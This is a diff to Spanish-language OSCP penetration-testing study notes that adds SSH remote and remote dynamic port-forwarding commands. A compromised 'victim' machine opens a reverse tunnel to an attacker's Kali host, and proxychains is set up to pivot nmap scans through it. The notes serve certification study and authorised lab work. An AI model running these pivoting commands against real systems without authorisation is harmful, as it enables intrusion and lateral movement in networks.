@@ -388,7 +388,24 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
     ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 
-  El puerto 2345 de la máquina víctima 1 es ahora el puerto 5432 de la máquina victima 2 '10.4.50.215'. Todo eso nos lo llevamos a nuestro kali de ataque con la última parte del comando 'kali@192.168.118.4'
+  El puerto 2345 de la máquina víctima 1 es ahora el puerto 5432 de la máquina victima 2 '10.4.50.215'. Todo eso nos lo llevamos a nuestro kali de ataque con la última parte del comando 'kali@192.168.118.4'.
+
+  Para comprobarlo, podemos lanzar lo siguiente:
+
+    ss -ntplu
+
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/765d9fac-c597-4a8b-82e3-4f7b85558690)
+
+  SSH Remote Dynamic Port Fordwarding:
+
+    ssh -N -R 9998 kali@192.168.118.4
+
+  El puerto 9998 de la máquina víctima nos lo llevamos a nuestra máquina Kali de ataque. En /etc/proxychains.conf añadimos la línea:
+
+    socks5 127.0.0.1 9998
+
+  Así, cuando utilicemos proxychains para por ejemplo realizar un escaneo con nmap, utilizará el proxy añadido por el puerto 9998.
+
 
 ## Vulnerabilidades conocidas
 
